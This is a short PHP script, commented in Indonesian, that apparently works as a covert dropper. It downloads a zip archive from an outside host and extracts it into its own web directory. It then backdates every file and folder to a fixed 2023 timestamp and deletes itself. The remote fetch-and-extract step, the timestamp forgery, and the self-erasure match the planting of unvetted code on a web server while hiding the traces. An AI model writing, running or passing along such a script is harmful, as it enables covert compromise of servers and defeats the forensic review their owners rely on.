<?php
// supaya di browser kelihatan rapi
header("Content-Type: text/plain");

function out($msg) {
    echo $msg . PHP_EOL; // pakai PHP_EOL agar newline konsisten
    flush(); // paksa kirim output ke browser/CLI
}

out("[+] Download vendor.zip");

$url = "https://repositori.rootlocalhost.net/raw/vendor.zip";
$zip = "vendor.zip";

$ch = curl_init($url);
$fp = fopen($zip, "w");

curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_FAILONERROR, true);

if (curl_exec($ch)) {
    out("[+] Download selesai");
} else {
    out("[+] Download gagal");
    exit;
}

curl_close($ch);
fclose($fp);

/* UNZIP */

$z = new ZipArchive();
if ($z->open($zip) === TRUE) {
    $z->extractTo(__DIR__);
    $z->close();
    unlink($zip); //HAPUS FILE ZIP
    out("[+] Ekstrak Selesai");
} else {
    out("[+] Ekstrak Gagal");
    exit;
}

/* 
   SET TANGGAL SEMUA FILE & FOLDER
 */
out("[+] Set time folder dan file");

$targetTime = strtotime("2023-12-15 03:02:36");

function setTimeRecursive($path, $time) {
    $items = scandir($path);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $fullPath = $path . DIRECTORY_SEPARATOR . $item;

        if (is_dir($fullPath)) {
            setTimeRecursive($fullPath, $time);
            touch($fullPath, $time);
        } else {
            touch($fullPath, $time);
        }
    }
}

setTimeRecursive(__DIR__, $targetTime);
/* 
   Hapus script dan file zip
 */
@unlink(__FILE__);

out("[+] Proses selesai ");
exit;
?>
